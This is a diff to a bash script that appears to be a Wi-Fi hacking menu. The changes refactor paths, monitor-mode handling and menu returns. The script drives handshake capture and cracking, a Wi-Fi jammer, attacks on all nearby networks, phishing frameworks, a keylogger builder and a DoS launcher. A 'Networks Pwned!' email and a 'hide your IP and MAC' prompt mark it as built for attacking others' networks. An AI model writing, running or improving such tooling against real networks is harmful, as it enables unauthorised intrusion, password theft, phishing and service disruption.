@@ -6,15 +6,30 @@ if [ $(id -u) -ne 0 ]; then
 	echo "This script must be ran as root"
 	exit 1
 fi
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+HANDSHAKE_DIR="$SCRIPT_DIR/handshakes"
+TOOLS_DIR="$SCRIPT_DIR/tools"
+base_interface=""
+monitor_interface=""
+
+enter_tool_dir() {
+    local path="$1"
+    if [ ! -d "$path" ]; then
+        echo "Tool path not found: $path"
+        return 1
+    fi
+    cd "$path" || return 1
+}
 network () {
 echo "Please, select a network interface:"
-cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
-airmon-ng start $foo > /dev/null 2>&1
+cd /sys/class/net && select foo in *; do echo $foo selected $foo; base_interface="$foo"; break; done
+airmon-ng start "$base_interface" > /dev/null 2>&1
 echo "Please, select the interface in monitor mode:"
-cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
-cd /home/*/air-script
+cd /sys/class/net && select foo in *; do echo $foo selected $foo; monitor_interface="$foo"; break; done
+foo="$monitor_interface"
+cd "$SCRIPT_DIR"
 }
-chmod -R 755 *
 sudo postfix start > /dev/null 2>&1
 sudo systemctl start postfix > /dev/null 2>&1
 clear
@@ -80,39 +95,39 @@ menu () {        ##### Display available options in two columns #####
         echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
         read -p "└─────►$(tput setaf 7) " option
         case $option in
-            1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network.."
-               wifiHacking
-               ;;
-            2) echo -e "\n[${Green}Selected${White}] Option 2 Decrypt Password(s).."
-               crack
-               exit 0
-               ;;
-            3) echo -e "\n[${Green}Selected${White}] Option 3 Wifi Jammer..."
-               wifiJammer
-               exit 0
-               ;;
-            4) echo -e "\n[${Green}Selected${White}] Option 4 Changing MAC Address..."
-               macChange
-               exit 0
-               ;;
-            5) echo -e "\n[${Green}Selected${White}] Option 5 Anonsurf..."
-               anonsurf
-               exit 0
-               ;;
-            6) echo -e "\n[${Green}Selected${White}] Option 6 View log of cracked networks..."
-               log
-               exit 0
-               ;;
-            7) echo -e "\n[${Green}Selected${White}] Option 7 Extra Tools..."
-               tools
-               exit 0
-               ;;
-            8) echo -e "\n[${Green}Selected${White}] Option 8 Help..."
-               Help
-               exit 0
-               ;;
-            9) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
-               exit 0
+  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network.."
+     wifiHacking
+     ;;
+  2) echo -e "\n[${Green}Selected${White}] Option 2 Decrypt Password(s).."
+     crack
+     return
+     ;;
+  3) echo -e "\n[${Green}Selected${White}] Option 3 Wifi Jammer..."
+     wifiJammer
+     return
+     ;;
+  4) echo -e "\n[${Green}Selected${White}] Option 4 Changing MAC Address..."
+     macChange
+     return
+     ;;
+  5) echo -e "\n[${Green}Selected${White}] Option 5 Anonsurf..."
+     anonsurf
+     return
+     ;;
+  6) echo -e "\n[${Green}Selected${White}] Option 6 View log of cracked networks..."
+     log
+     return
+     ;;
+  7) echo -e "\n[${Green}Selected${White}] Option 7 Extra Tools..."
+     tools
+     return
+     ;;
+  8) echo -e "\n[${Green}Selected${White}] Option 8 Help..."
+     Help
+     return
+     ;;
+  9) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
+     exit 0
                ;;
             *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
                ;;
@@ -139,27 +154,27 @@ case $option in
      ;;
   2) echo -e "\n[${Green}Selected${White}] Option 2 Fluxion.."
      FluxionMenu
-     exit 0
+     return
      ;;
   3) echo -e "\n[${Green}Selected${White}] Option 3 Wifite.."
      Wifite
-     exit 0
+     return
      ;;
   4) echo -e "\n[${Green}Selected${White}] Option 4 Wifite2.."
      Wifite2
-     exit 0
+     return
      ;;
   5) echo -e "\n[${Green}Selected${White}] Option 5 Wifiphisher.."
      StartWifiphisher
-     exit 0
+     return
      ;;
   6) echo -e "\n[${Green}Selected${White}] Option 6 Fern.."
      Fern
-     exit 0
+     return
      ;;
   7) echo -e "\n[${Green}Selected${White}] Option 7 Airgeddon.."
      airogeddon
-     exit 0
+     return
      ;;
   8) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
      exit 0
@@ -187,11 +202,11 @@ case $option in
      ;;
   2) echo -e "\n[${Green}Selected${White}] Option 2 Hack All Networks.."
      attackAll
-     exit 0
+     return
      ;;
   3) echo -e "\n[${Green}Selected${White}] Option 3 PMKID Attack.."
      pmkid_all
-     exit 0
+     return
      ;;
   4) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
      exit 0
@@ -235,7 +250,9 @@ echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
 check_cap_files
 sleep 3
 pkill -9 xterm
-echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
+if [ -n "$email" ]; then
+    echo "Handshakes have been captured!" | mail -s "Networks Pwned!" "$email"
+fi
 #crack
 }
 
@@ -305,7 +322,9 @@ attackAllYes() {
     # Once Besside-ng completes (or captures a handshake), it will stop and output results
     echo -e "${Green}Handshakes capture complete. Saved in ~/handshakes/"
     stopMon 
-    echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
+    if [ -n "$email" ]; then
+        echo "Handshakes have been captured!" | mail -s "Networks Pwned!" "$email"
+    fi
 				crack 
 }
 
@@ -328,11 +347,14 @@ crack () {
 checkServices
 	stopMon
 sleep 2
-    echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
+    if [ -n "$email" ]; then
+        echo "Handshakes have been captured!" | mail -s "Networks Pwned!" "$email" > /dev/null 2>&1
+    fi
     # Check if there are any .cap files in the current directory
     if ! ls *.cap &>/dev/null; then
-        # If no .cap files found, change to /handshakes directory without output
-        cd handshakes &>/dev/null
+        mkdir -p "$HANDSHAKE_DIR"
+        # If no .cap files found, change to handshakes directory without output
+        cd "$HANDSHAKE_DIR" &>/dev/null
     fi
 				
     crack_hashes
@@ -386,7 +408,8 @@ crack_hashes() {
                     exit 1
                 fi
 
-                    key_file="/home/*/air-script/key.txt"
+                    script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+                    key_file="$script_dir/key.txt"
 
                 if [[ ! -f "$key_file" ]]; then
                     echo "key.txt file not found. Exiting."
@@ -438,28 +461,27 @@ cleanup () {
     sudo rm -f *.hc22000 > /dev/null 2>&1
     sudo rm -f essidlist > /dev/null 2>&1
     cleanup_handshakes
-    sudo mv *pcapng /handshakes > /dev/null 2>&1
+    if ls *pcapng >/dev/null 2>&1; then
+        mkdir -p "$HANDSHAKE_DIR"
+        sudo mv *pcapng "$HANDSHAKE_DIR" > /dev/null 2>&1
+    fi
 }
 
 
 cleanup_handshakes() {
-    # Define the directory path explicitly
-    local script_dir="/home/*/air-script"  # Adjust the path to your actual script location
-
-    # Ensure you're in the correct directory
-    if [ ! -d "$script_dir/handshakes" ]; then
+    # Ensure handshakes directory exists
+    if [ ! -d "$HANDSHAKE_DIR" ]; then
         echo "Creating handshakes directory..."
-        mkdir -p "$script_dir/handshakes"
+        mkdir -p "$HANDSHAKE_DIR"
     fi
 
     echo "Renaming and moving .cap files to handshakes folder..."
-    # Change to the script directory
-    cd "$script_dir" || { echo "Failed to change directory to $script_dir"; exit 1; }
+    cd "$SCRIPT_DIR" || { echo "Failed to change directory to $SCRIPT_DIR"; exit 1; }
 
     for cap_file in *.cap; do
         if [ -f "$cap_file" ]; then
             timestamp=$(date +"%Y-%m-%d_%H-%M-%S")
-            new_file="handshakes/${timestamp}_$(basename "$cap_file")"
+            new_file="$HANDSHAKE_DIR/${timestamp}_$(basename "$cap_file")"
             mv "$cap_file" "$new_file"
         fi
     done
@@ -473,8 +495,7 @@ cleanup_handshakes() {
 
 
 FluxionMenu() {
-cd /home/*/air-script/tools
-cd fluxion
+enter_tool_dir "$TOOLS_DIR/fluxion" || return
 sudo ./fluxion.sh
 }
 
@@ -484,8 +505,7 @@ sudo wifite
 
 Wifite2 () {
 wifite
-cd /home/*/air-script/tools
-cd wifite2
+enter_tool_dir "$TOOLS_DIR/wifite2" || return
 sudo ./Wifite.py
 }
 
@@ -501,8 +521,7 @@ sudo fern-wifi-cracker
 
 
 airogeddon () {
-cd /home/*/air-script/tools
-cd airgeddon
+enter_tool_dir "$TOOLS_DIR/airgeddon" || return
 sudo bash airgeddon.sh
 }
 
@@ -653,7 +672,7 @@ wifiJammer() {
 
     if [ "$network_choice" -eq 2 ]; then
         echo "Feature to target another network is not implemented yet."
-        exit 0
+        return
     fi
 
     echo "Available attack methods:"
@@ -804,38 +823,41 @@ captureMAC() {
 
 
 monitor() {
-    #foo="wlan0"   # Example interface, replace with the correct one if needed
-   airmon-ng check kill
-    # Check if the interface exists
-    if ! iwconfig $foo > /dev/null 2>&1; then
+    airmon-ng check kill
+
+    if [ -z "$base_interface" ]; then
+        base_interface="$foo"
+    fi
+
+    if ! iwconfig "$foo" > /dev/null 2>&1; then
         echo "Interface $foo not found. Please check your device."
         exit 1
     fi
 
-    # Start monitor mode (check if this works before continuing)
-#    echo "Starting monitor mode on $foo..."
- #   airmon-ng start $foo > /dev/null 2>&1
-  #  if [ $? -ne 0 ]; then
-   #     echo "Failed to start monitor mode on $foo. Please check your device."
-    #    exit 1
-    #fi
-# Start monitor mode (check if this works before continuing)
-echo -e "\e[32m[Starting monitor mode on $foo...]\e[0m"
-airmon-ng start $foo > /dev/null 2>&1
-if [ $? -ne 0 ]; then
-    echo -e "\e[31mFailed to start monitor mode on $foo. Please check your device.\e[0m"
-    exit 1
-fi
-    # Set up a cleanup trap
-    trap "airmon-ng stop $foo > /dev/null; rm -f generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
+    if iw dev "$foo" info 2>/dev/null | grep -q "type monitor"; then
+        echo -e "\e[32m[$foo already in monitor mode]\e[0m"
+        monitor_interface="$foo"
+    else
+        echo -e "\e[32m[Starting monitor mode on $foo...]\e[0m"
+        if ! airmon-ng start "$foo" > /dev/null 2>&1; then
+            echo -e "\e[31mFailed to start monitor mode on $foo. Please check your device.\e[0m"
+            exit 1
+        fi
+        if iw dev "${foo}mon" info >/dev/null 2>&1; then
+            monitor_interface="${foo}mon"
+        else
+            monitor_interface="$foo"
+        fi
+    fi
 
-    # Run airodump-ng in background and redirect output
+    foo="$monitor_interface"
+    trap "command -v airmon-ng >/dev/null 2>&1 && airmon-ng stop \"$monitor_interface\" > /dev/null 2>&1; rm -f generated-01.csv handshake-01.cap 2> /dev/null" EXIT
+
     echo "Starting airodump-ng scan on $foo..."
-    airodump-ng --output-format kismet --write generated $foo > /dev/null & 
-    airodump_pid=$!   # Capture PID of airodump-ng
+    airodump-ng --output-format csv --write generated "$foo" > /dev/null &
+    airodump_pid=$!
     sleep 20
 
-    # Check if the airodump-ng process is still running
     if ps -p $airodump_pid > /dev/null; then
         echo "Killing airodump-ng process..."
         kill $airodump_pid
@@ -843,61 +865,84 @@ fi
         echo "airodump-ng process already stopped."
     fi
 
-    # Check if the CSV file was created
-    if [ ! -f "generated-01.kismet.csv" ]; then
-        echo "Error: generated-01.kismet.csv not found. Is airodump-ng running correctly?"
+    if [ ! -f "generated-01.csv" ]; then
+        echo "Error: generated-01.csv not found. Is airodump-ng running correctly?"
         exit 1
     fi
 
-    # Remove the header from the CSV
-    sed -i '1d' generated-01.kismet.csv
-
-    # Debugging: Print out the first few rows of the CSV to ensure we're capturing the correct columns
     echo -e "\n\n${Red}CSV Raw Data (First 5 lines)${White}:"
-    head -n 5 generated-01.kismet.csv
+    head -n 5 generated-01.csv
 
-    # Print the available networks (SSID and BSSID) for the user to select
-    echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
-    awk -F ";" '{gsub(/^[ \t]+|[ \t]+$/, "", $3); gsub(/^[ \t]+|[ \t]+$/, "", $4); print NR, $3, $4}' generated-01.kismet.csv | nl -n ln -w 8
+    # Build the network list from the access point section (skip station rows).
+    # Use manual BSSID validation to avoid mawk regex crashes seen with some patterns.
+    mapfile -t network_rows < <(
+        awk -F',' '
+            NR == 1 { next }
+            NF >= 14 {
+                gsub(/^[ \t]+|[ \t]+$/, "", $1)
+                gsub(/^[ \t]+|[ \t]+$/, "", $4)
+                gsub(/^[ \t]+|[ \t]+$/, "", $14)
 
-    # Get the number of networks in the file
-    total_networks=$(wc -l < generated-01.kismet.csv)
-    if [ -z "$total_networks" ] || [ "$total_networks" -eq 0 ]; then
+                # Validate BSSID: expect 6 hex pairs separated by colons.
+                n = split($1, parts, ":")
+                if (n != 6) {
+                    next
+                }
+                valid = 1
+                for (i = 1; i <= n; i++) {
+                    if (length(parts[i]) != 2 || parts[i] !~ /^[0-9A-Fa-f][0-9A-Fa-f]$/) {
+                        valid = 0
+                        break
+                    }
+                }
+                if (valid) {
+                    print $1","$4","$14
+                }
+            }
+        ' generated-01.csv
+    )
+
+    total_networks=${#network_rows[@]}
+    if [ "$total_networks" -eq 0 ]; then
         echo "No networks found. Please check if airodump-ng is running correctly."
         exit 1
     fi
 
-    # Prompt user to select a target network
-    targetNumber=1000
-    while [ ${targetNumber} -gt ${total_networks} ] || [ ${targetNumber} -lt 1 ]; do 
-        echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-        read -p "└─────►$(tput setaf 7) " targetNumber
+    echo -e "\n\n${Red}Available Networks${White}"
+    for idx in "${!network_rows[@]}"; do
+        IFS=',' read -r bssid channel essid <<< "${network_rows[$idx]}"
+        # Use a friendly placeholder for hidden SSIDs
+        display_name="$essid"
+        if [ -z "$display_name" ]; then
+            display_name="(hidden network)"
+        fi
+
+        printf "%3d) %s\n" $((idx + 1)) "$display_name"
     done
 
-   # Extract network details using awk with whitespace handling
-targetName=$(awk -F ';' "NR==${targetNumber} {print \$3}" generated-01.kismet.csv | xargs)
-bssid=$(awk -F ';' "NR==${targetNumber} {print \$4}" generated-01.kismet.csv | xargs)
-channel=$(awk -F ';' "NR==${targetNumber} {print \$6}" generated-01.kismet.csv | xargs)
+    targetNumber=0
+    while [ "$targetNumber" -lt 1 ] || [ "$targetNumber" -gt "$total_networks" ]; do
+        echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
+        read -p "└─────►$(tput setaf 7) " targetNumber
+        [[ "$targetNumber" =~ ^[0-9]+$ ]] || targetNumber=0
+    done
 
-# Output the selected target
-echo -e "\n${Green}You have selected the following network:${White}"
-echo -e "${Green}SSID:${White} ${targetName}"
-echo -e "${Green}BSSID:${White} ${bssid}"
-echo -e "${Green}Channel:${White} ${channel}"
+    IFS=',' read -r bssid channel targetName <<< "${network_rows[$((targetNumber - 1))]}"
 
-# Set the wifi card to the target channel
-sudo iwconfig $foo channel $channel
+    echo -e "\n${Green}You have selected the following network:${White}"
+    echo -e "${Green}SSID:${White} ${targetName}"
+    echo -e "${Green}BSSID:${White} ${bssid}"
+    echo -e "${Green}Channel:${White} ${channel}"
 
-    # Check if BSSID is empty, and alert the user if necessary
-    if [ -z "$bssid" ]; then
-        echo -e "${Red}Error: Invalid BSSID. Please try again with a valid target network.${White}"
+    if [ -z "$bssid" ] || [ -z "$channel" ]; then
+        echo -e "${Red}Error: Invalid target details. Please try again with a valid network.${White}"
         exit 1
     fi
 
-    # Clean up the CSV file
-    rm generated-01.kismet.csv 2> /dev/null
+    sudo iwconfig "$foo" channel "$channel"
 
-    # Confirm that we are preparing for the attack
+    rm generated-01.csv 2> /dev/null
+
     echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
 }
 
@@ -942,10 +987,10 @@ check_cap_files() {
                 
                 # Turn off monitor mode silently
                 echo "Turning off monitor mode..."
-                sudo airmon-ng stop  > /dev/null 2>&1
-                sudo airmon-ng stop wlp7s0mon > /dev/null 2>&1
-                sudo systemctl start NetworkManager > /dev/null 2>&1
-                echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
+                stopMon
+                if [ -n "$email" ]; then
+                    echo "Handshakes have been captured!" | mail -s "Networks Pwned!" "$email" > /dev/null 2>&1
+                fi
                 # Now proceed with cracking
                 crack "$cap_file"  # Assuming 'crack' is a function that accepts the file
                 
@@ -1155,7 +1200,7 @@ crackCAT () {
                 read -p "Path to .pcapng file: " capture_file
 
                 # Check if the file exists
-                if [[ ! -f "$capture_file.pcapng" ]]; then
+                if [[ ! -f "$capture_file" ]]; then
                     echo "File not found. Exiting."
                     exit 1
                 fi
@@ -1185,10 +1230,10 @@ crackCAT () {
                 fi
 
                 # Upload to WPA-Sec
-                echo "Uploading $cap_file to WPA-Sec..."
+                echo "Uploading $capture_file to WPA-Sec..."
                 response=$(curl -s -w "%{http_code}" -X POST "https://wpa-sec.stanev.org/?submit" \
                     -F "email=$user_email" \
-                    -F "file=@$capture_file.pcapng" \
+                    -F "file=@$capture_file" \
                     -F "key=$key" \
                     -F "submit=Submit")
 
@@ -1234,18 +1279,18 @@ read -p "└─────►$(tput setaf 7) " option
 case $option in
   1) echo -e "\n[${Green}Selected${White}] Changing MAC Address..."
      spoofMAC
-     exit 0
+     return
      ;;
   2) echo -e "\n[${Green}Selected${White}] Restore MAC Address.."
      RestoreMAC
-     exit 0
+     return
      ;; 
   3) echo -e "\n[${Green}Selected${White}] Current MAC Address.."
      showMAC
-     exit 0
+     return
      ;; 
   4) echo -e "\n[${Green}Selected${White}] Going back.."
-     exit 0
+     return
      ;;
   *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
      ;;
@@ -1303,38 +1348,38 @@ read -p "└─────►$(tput setaf 7) " option
 case $option in
   1) echo -e "\n[${Green}Selected${White}] Start Anonsurf"
      anonsurfStart
-     exit 0
+     return
      ;;
   2) echo -e "\n[${Green}Selected${White}] Show Anonsurf Status"
      anonsurfStatus
-     exit 0
+     return
      ;; 
   3) echo -e "\n[${Green}Selected${White}] Stop Anonsurf"
      anonsurfStop
-     exit 0
+     return
      ;; 
   4) echo -e "\n[${Green}Selected${White}] Restart Anonsurf"
      anonsurfRestart
-     exit 0
+     return
      ;; 
   5) echo -e "\n[${Green}Selected${White}] Changeing Identity Restarting TOR"
      anonsurfChange
-     exit 0
+     return
      ;; 
   6) echo -e "\n[${Green}Selected${White}] Start i2p Services"
      anonsurfStarti2p
-     exit 0
+     return
      ;; 
   7) echo -e "\n[${Green}Selected${White}] Stop i2p Services"
      anonsurfStopi2p
-     exit 0
+     return
      ;; 
   8) echo -e "\n[${Green}Selected${White}] Show your current IP address"
      anonip
-     exit 0
+     return
      ;; 
   9) echo -e "\n[${Green}Selected${White}] Going back.."
-     exit 0
+     return
      ;;
   *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
      ;;
@@ -1437,34 +1482,29 @@ done
 
 
 zirikatu () {
-cd /home/*/air-script/tools
-cd zirikatu
+enter_tool_dir "$TOOLS_DIR/zirikatu" || return
 sudo ./zirikatu.sh
 
 }
 
 routersploit () {
-cd /home/*/air-script/tools
-cd routersploit
+enter_tool_dir "$TOOLS_DIR/routersploit" || return
 python3 rsf.py
 
 }
 
 Zatacker () {
-cd /home/*/air-script/tools
-cd Zatacker
+enter_tool_dir "$TOOLS_DIR/Zatacker" || return
 ./ZT.sh
 }
 
 morpheus () {
-cd /home/*/air-script/toolshome/air-script/tools
-cd morpheus
+enter_tool_dir "$TOOLS_DIR/morpheus" || return
 sudo ./morpheus.sh
 }
 
 Hakku () {
-cd /home/*/air-script/tools
-cd hakkuframework
+enter_tool_dir "$TOOLS_DIR/hakkuframework" || return
 ./hakku
 
 }
@@ -1475,39 +1515,33 @@ trity
 }
 
 Cupp () {
-cd /home/*/air-script/tools
-cd cupp
+enter_tool_dir "$TOOLS_DIR/cupp" || return
 python3 cupp.py -i
 }
 
 dracnmap () {
-cd /home/*/air-script/tools
-cd Dracnmap
+enter_tool_dir "$TOOLS_DIR/Dracnmap" || return
 chmod +x dracnmap-v2.2.sh
 sudo ./dracnmap-v2.2.sh
 
 }
 
 kickthemout () {
-cd /home/*/air-script/tools
-cd kickthemout
+enter_tool_dir "$TOOLS_DIR/kickthemout" || return
 sudo python3 kickthemout.py
 
 }
 
 
 ghostPhisher () {
-cd /home/*/air-script/tools
-cd ghost-phisher
-cd Ghost-Phisher
+enter_tool_dir "$TOOLS_DIR/ghost-phisher/Ghost-Phisher" || return
 chmod +x ghost.py
 sudo ./ghost.py
 }
 
 
 Xerxes () {
-cd /home/*/air-script/tools
-cd XERXES
+enter_tool_dir "$TOOLS_DIR/XERXES" || return
 echo "Xerxes DoS Attack"
 sleep 3
 echo "Remember to hide your IP and MAC"
@@ -1519,12 +1553,11 @@ sudo ./xerxes $ip
 
 
 Katana () {
-cd /home/*/air-script/tools
-cd KatanaFramework
+enter_tool_dir "$TOOLS_DIR/KatanaFramework" || return
 sudo ./ktf.run
 sudo ./ktf.run -h
 echo -e "\n[${Green}Selected${White}] Going back.."
-     exit 0
+     return
   
 }
 
@@ -1535,15 +1568,13 @@ sudo websploit
 
 
 BeeLogger () {
-cd /home/*/air-script/tools
-cd BeeLogger
+enter_tool_dir "$TOOLS_DIR/BeeLogger" || return
 sudo python bee.py
 }
 
 
 ezsploit () {
-cd /home/*/air-script/tools
-cd ezsploit
+enter_tool_dir "$TOOLS_DIR/ezsploit" || return
 sudo ./ezploit.sh
 
 
@@ -1560,16 +1591,14 @@ sudo sh /usr/bin/ipscan
 
 
 Sn1per () {
-cd /home/*/air-script/tools
-cd Sn1per
+enter_tool_dir "$TOOLS_DIR/Sn1per" || return
 sudo sniper
 
 }
 
 
 redhawk () {
-cd /home/*/air-script/tools
-cd RED_HAWK
+enter_tool_dir "$TOOLS_DIR/RED_HAWK" || return
 php rhawk.php
 
 }
@@ -1589,26 +1618,26 @@ read -p "└─────►$(tput setaf 7) " option
 case $option in
   1) echo -e "\n[${Green}Selected${White}] How to set up ad hoc network?"
      instructions
-     exit 0
+     return
      ;;
   2) echo -e "\n[${Green}Selected${White}] Fix this shit.."
      fix
-     exit 0
+     return
      ;; 
   3) echo -e "\n[${Green}Selected${White}] Fixing monitor mode.."
      stopMon
-     exit 0
+     return
      ;; 
   4) echo -e "\n[${Green}Selected${White}] Running uninstall tool.."
     uninstall
-     exit 0
+     return
      ;; 
   5) echo -e "\n[${Green}Selected${White}] Cleaning captured handshakes.."
     clean
-     exit 0
+     return
      ;; 
   6) echo -e "\n[${Green}Selected${White}] Going back.."
-     exit 0
+     return
      ;;
   *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
      ;;
@@ -1629,12 +1658,19 @@ run_script_if_exists "uninstall.sh"
 }
 
 stopMon () {
-  sudo airmon-ng stop $foo > /dev/null 2>&1
-  sudo airmon-ng stop  > /dev/null 2>&1
-  sudo airmon-ng stop wlp7s0mon > /dev/null 2>&1
-		sudo systemctl start NetworkManager > /dev/null 2>&1
+  if command -v airmon-ng >/dev/null 2>&1; then
+    if [ -n "$monitor_interface" ]; then
+      sudo airmon-ng stop "$monitor_interface" > /dev/null 2>&1
+    fi
+    if [ -n "$base_interface" ]; then
+      sudo airmon-ng stop "$base_interface" > /dev/null 2>&1
+    fi
+  fi
+  sudo systemctl start NetworkManager > /dev/null 2>&1
   sudo systemctl start wpa_supplicant > /dev/null 2>&1
   echo -e "\e[32mmonitor mode disabled.\e[0m"
+  monitor_interface=""
+  base_interface=""
 }
 
 
@@ -1651,9 +1687,6 @@ echo " https://github.com/B3ND1X/nm4n00bz"
 
 
 
-
-# Script path
-SCRIPT_DIR="/home/*/air-script"  # Define the air-script directory path
 
 # Function to check if the script exists and run it
 run_script_if_exists() {
@@ -1681,7 +1714,7 @@ run_script_if_exists "setup_postfix.sh"
 
 
 log(){
-cat besside.log
+cat "$SCRIPT_DIR/besside.log"
 }
 
 spinner() {        ##### Animation while scanning for available networks #####
@@ -1695,12 +1728,24 @@ echo -ne "[${Green}$foo${White}] Scanning for available networks...${spin:i--%le
 done
 }
 
+cleanup_in_progress=false
+
 # Define a function to handle interruptions
 interrupt_handler() {
+    # Avoid re-entrancy if multiple signals arrive
+    if [ "$cleanup_in_progress" = true ]; then
+        return
+    fi
+    cleanup_in_progress=true
+
+    # Stop handling further interrupts during cleanup
+    trap - SIGINT SIGTERM
+
     echo "Script interrupted! Cleaning up..."
     stopMon
-    # Perform cleanup tasks here
-	cleanup
+    cleanup
+    exit 130
+}
 
 # Set up the trap for SIGINT (Ctrl+C) and SIGTERM (kill command)
 trap interrupt_handler SIGINT SIGTERM
@@ -1710,8 +1755,6 @@ trap interrupt_handler SIGINT SIGTERM
 #while true; do
 #    sleep 1
 #done
-}
-
 
 
 
